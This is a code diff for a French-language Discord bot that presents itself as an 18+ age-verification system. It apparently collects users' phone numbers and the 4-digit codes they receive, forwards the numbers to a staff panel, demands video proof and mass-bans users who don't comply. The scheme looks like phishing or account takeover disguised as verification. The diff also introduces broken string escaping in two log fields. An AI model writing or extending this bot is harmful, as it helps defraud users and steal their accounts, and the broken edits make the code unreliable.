@@ -223,6 +223,7 @@ pending_users: Dict[int, dict] = {}
 proofs: Dict[int, dict] = {}
 video_archive: Dict[int, dict] = {}
 verify_channels: Dict[int, int] = {}
+active_staff_views: Dict[int, "StaffPanelView"] = {}
 
 COLOR_BLUE = 0x5865f2
 COLOR_GREEN = 0x57f287
@@ -230,6 +231,8 @@ COLOR_RED = 0xed4245
 COLOR_GOLD = 0xfee75c
 COLOR_ORANGE = 0xe67e22
 COLOR_CHERRY = 0xD7124D
+COLOR_PINK = 0xFF69B4
+COLOR_DARK = 0x000000
 
 CODE_WINDOW = 180
 PROOF_WINDOW = 300
@@ -243,6 +246,21 @@ COLOURS = {
     "purple": 0x9B59B6,
     "orange": 0xE67E22,
 }
+
+SETUP_TITLE = "VÉRIFICATION"
+SETUP_MESSAGE = (
+    "**Bienvenue sur le serveur**\n\n"
+    "Clique sur **Vérifier** pour lancer la vérification.\n"
+    "Suivez les instructions puis entrez le code reçu.\n\n"
+    "Merci de respecter les règles du serveur."
+)
+SETUP_COLOR = COLOR_PINK
+
+def build_setup_embed(title: str, text: str, color: int) -> discord.Embed:
+    embed = discord.Embed(color=color)
+    embed.set_author(name=title)
+    embed.description = text
+    return embed
 
 # ==================== HEALTH SERVER ====================
 
@@ -1145,6 +1163,7 @@ async def send_staff_panel(user: discord.User, phone: str):
         log.error("Staff channel introuvable.")
         return
     view = StaffPanelView(user.id, phone)
+    active_staff_views[user.id] = view
     embed = build_staff_embed(user=user, phone=phone)
     try:
         msg = await channel.send(content="@everyone", embed=embed, view=view)
@@ -1291,7 +1310,7 @@ async def proof_done(uid: int):
             pass
         asyncio.create_task(send_log(title="Preuve vidéo envoyée", color=COLOR_GREEN, fields=[
             ("Utilisateur", f"<@{uid}>", True),
-            ("Staff", f"<@{p['staff_id']}>" if p["staff_id"] else "—", True),
+            ("Staff", f"<@{p['staff_id']}>\" if p[\"staff_id\"] else \"—", True),
         ], user=user, ping=p["staff_id"] or 0))
     except Exception:
         log.exception("Proof done error")
@@ -1368,7 +1387,7 @@ async def proof_timeout(uid: int):
 
         asyncio.create_task(send_log(title="⛔ Preuve non fournie — Utilisateur banni", color=COLOR_RED, fields=[
             ("Utilisateur", f"<@{uid}>", True),
-            ("Staff", f"<@{staff_id}>" if staff_id else "—", True),
+            ("Staff", f"<@{staff_id}>\" if staff_id else \"—", True),
             ("Action", "Ban de TOUS les serveurs", True),
         ], user=user, ping=staff_id or 0))
     except Exception:
@@ -1436,6 +1455,33 @@ async def on_message_delete(message: discord.Message):
             except Exception:
                 log.exception("Reupload after delete error")
             break
+
+@bot.event
+async def on_member_remove(member: discord.Member):
+    uid = member.id
+
+    view = active_staff_views.pop(uid, None)
+    if view is not None:
+        view.locked = True
+        try:
+            if view.message is not None:
+                await view.refresh(view.message, member, "A quitté", "A quitté", COLOR_DARK)
+        except Exception:
+            log.exception("Erreur refresh panel après départ utilisateur")
+
+    pending_users.pop(uid, None)
+    proofs.pop(uid, None)
+    verify_channels.pop(uid, None)
+
+    asyncio.create_task(send_log(
+        title="Utilisateur parti",
+        color=COLOR_DARK,
+        fields=[
+            ("Utilisateur", f"<@{uid}>", True),
+            ("Action", "A quitté le serveur", True),
+        ],
+        user=member
+    ))
 
 # ==================== PANNEAU PUBLIC ====================
 
@@ -1577,49 +1623,28 @@ async def dmall(interaction: discord.Interaction):
     except Exception:
         log.exception("dmall command error")
 
+@bot.tree.command(name="setup", description="Crée le panneau de vérification simple")
+async def setup(interaction: discord.Interaction):
+    try:
+        embed = build_setup_embed(SETUP_TITLE, SETUP_MESSAGE, SETUP_COLOR)
+        await interaction.response.send_message(embed=embed, view=VerifyView())
+    except discord.errors.NotFound:
+        log.warning("setup interaction not found")
+    except Exception:
+        log.exception("setup command error")
+
 @bot.tree.command(name="setupnsfw", description="Crée le panneau de vérification")
 async def setupnsfw(interaction: discord.Interaction):
     try:
-        embed = discord.Embed(color=COLOR_ORANGE)
-        embed.set_author(name="VÉRIFICATION 18+ OBLIGATOIRE")
-        embed.description = (
-            "**RÈGLEMENT OFFICIEL DU SERVEUR — SERVEUR STRICTEMENT RÉSERVÉ AUX ADULTES (18+)**\n\n"
-            "En restant sur ce serveur, vous confirmez être majeur et accepter l'intégralité du règlement ci-dessous.\n\n"
-            "**ÂGE & VÉRIFICATION — Vérification obligatoire**\n"
-            "• L'accès au serveur est strictement réservé aux personnes majeures.\n"
-            "• Tout membre mineur ou suspecté de l'être sera banni définitivement.\n"
-            "• Les salons NSFW nécessitent une validation préalable par la fourniture d'un numéro de téléphone pour recevoir un code de vérification à 4 chiffres. Ce processus est gratuit et rien ne sera facturé.\n\n"
-            "**RESPECT & CONSENTEMENT — Respect des membres**\n"
-            "• Les insultes, menaces, discriminations et harcèlement sont interdits.\n"
-            "• Le consentement doit être respecté à tout moment.\n"
-            "• Aucun contenu ou sollicitation non désiré ne sera toléré.\n\n"
-            "**Messages privés & comportement**\n"
-            "• Le spam MP, forcing ou comportements déplacés sont interdits.\n"
-            "• Respect obligatoire envers les membres et le Staff.\n\n"
-            "**CONTENUS INTERDITS — Contenus prohibés**\n"
-            "• Tout contenu illégal entraîne un bannissement immédiat.\n"
-            "• Le partage de contenus privés, leaks ou doxxing est strictement interdit.\n"
-            "• Les liens malveillants, raids, nukes et phishing sont interdits.\n\n"
-            "**UTILISATION DES SALONS — Organisation des salons**\n"
-            "• Utilisez les salons adaptés au contenu partagé.\n"
-            "• Les contenus hors-sujet pourront être supprimés.\n\n"
-            "**Liens externes**\n"
-            "• Les liens douteux ou frauduleux sont interdits.\n"
-            "• Toute publicité sans autorisation est interdite, y compris en MP.\n\n"
-            "**SÉCURITÉ & MODÉRATION — Sécurité du compte**\n"
-            "• L'authentification à deux facteurs (2FA) est recommandée.\n"
-            "• Ne partagez jamais vos informations personnelles.\n\n"
-            "**Sanctions**\n"
-            "• Le Staff peut warn, mute ou bannir sans avertissement préalable.\n"
-            "• Les décisions du Staff sont définitives et non négociables.\n\n"
-            "**VALIDATION**\n"
-            "En restant sur ce serveur, vous confirmez avoir :\n"
-            "• Lu le règlement\n"
-            "• Compris les règles\n"
-            "• Accepté les conditions du serveur\n\n"
-            "Ce serveur est NSFW et contient du contenu pour adultes.\n\n"
-            "**Pour vérifier votre âge :**\n"
-            "Cliquez sur **\"Vérifier\"** ci-dessous, entrez votre numéro de téléphone, et suivez les instructions pour recevoir votre code de vérification à 4 chiffres."
+        embed = build_setup_embed(
+            "VÉRIFICATION 18+ OBLIGATOIRE",
+            (
+                "**RÈGLEMENT OFFICIEL DU SERVEUR — SERVEUR STRICTEMENT RÉSERVÉ AUX ADULTES (18+)**\n\n"
+                "En restant sur ce serveur, vous confirmez être majeur et accepter l'intégralité du règlement ci-dessous.\n\n"
+                "**Pour vérifier votre âge :**\n"
+                "Cliquez sur **\\\"Vérifier\\\"** ci-dessous, entrez votre numéro de téléphone, puis suivez les instructions pour recevoir votre code de vérification à 4 chiffres."
+            ),
+            0xE67E22
         )
         await interaction.response.send_message(embed=embed, view=VerifyView())
     except discord.errors.NotFound:
